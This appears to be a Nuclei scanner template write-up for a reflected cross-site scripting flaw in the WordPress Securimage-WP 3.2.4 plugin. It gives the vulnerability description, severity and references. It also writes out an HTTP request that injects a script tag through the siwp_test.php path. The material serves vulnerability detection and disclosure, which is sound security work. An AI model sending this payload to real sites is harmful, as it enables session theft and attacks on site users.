# Nuclei Template: WordPress Securimage-WP 3.2.4 - Cross-Site Scripting
**Template ID:** wp-securimage-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-securimage-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/securimage-wp/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1
```

## References
- https://www.exploit-db.com/exploits/38510
- http://web.archive.org/web/20210123054214/https://www.securityfocus.com/bid/59816/info
